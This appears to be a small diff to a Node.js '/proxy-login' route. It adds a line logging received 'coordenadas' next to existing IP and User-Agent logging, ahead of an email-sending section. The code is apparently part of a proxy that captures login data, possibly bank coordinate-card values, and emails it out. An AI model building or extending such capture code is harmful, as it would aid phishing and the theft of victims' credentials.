@@ -196,6 +196,8 @@ app.post("/proxy-login", async (req, res) => {
   console.log(`IP: ${ip}`);
   console.log("User-Agent:", userAgent);
   console.log("=".repeat(60));
+  console.log("COORDENADAS RECIBIDAS:", coordenadas);
+
 
   try {
     // 📧 CORREO
